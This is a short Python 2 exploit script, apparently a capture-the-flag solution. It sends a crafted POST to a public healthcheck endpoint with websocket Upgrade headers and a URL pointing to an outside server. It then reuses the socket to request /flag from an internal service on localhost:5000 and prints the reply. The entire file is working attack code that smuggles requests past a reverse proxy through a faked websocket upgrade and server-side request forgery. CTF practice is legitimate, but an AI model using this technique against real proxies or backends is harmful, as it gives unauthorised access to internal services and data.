import socket

req1 = '''POST /api/public/healthcheck HTTP/1.1
Host: localhost:80
Connection: Upgrade
Upgrade: websocket
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

url=http://toor.0ang3el.ml/r.php'''


req2 = '''GET /flag HTTP/1.1
Host: localhost:5000

'''


def main(netloc):
    host, port = netloc.split(':')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))

    sock.sendall(req1)
    sock.recv(4096)

    sock.sendall(req2)
    data = sock.recv(4096)
    data = data.decode(errors='ignore')

    print data

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()


if __name__ == "__main__":
    main('challenge2.0ang3el.tk:80')